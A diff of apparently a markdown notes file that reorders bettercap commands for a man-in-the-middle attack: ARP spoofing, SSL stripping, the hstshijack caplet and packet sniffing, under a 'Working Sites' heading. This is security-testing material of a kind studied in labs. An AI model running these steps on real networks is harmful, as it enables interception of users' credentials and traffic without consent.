@@ -32,15 +32,13 @@ net.sniff activates packet sniffing, so bettercap will start capturing and analy
 
 #### Bettercap Steps:
 0. sudo bettercap -iface eth0
-1. help
-2. caplets.show
-3. set http.proxy.sslstrip true
-4. hstshijack/hstshijack
-5. help
-6. net.probe on
-7. net.sniff on
-8. arp.spoof on
-
+1. caplets.show (optional)
+2. set http.proxy.sslstrip true
+3. hstshijack/hstshijack
+4. net.probe on
+5. net.sniff on
+6. arp.spoof on
+* Note: ```help``` is always available if you don't know what to do.
 
 #### Working Sites (in process)
 **Sites that worked:**
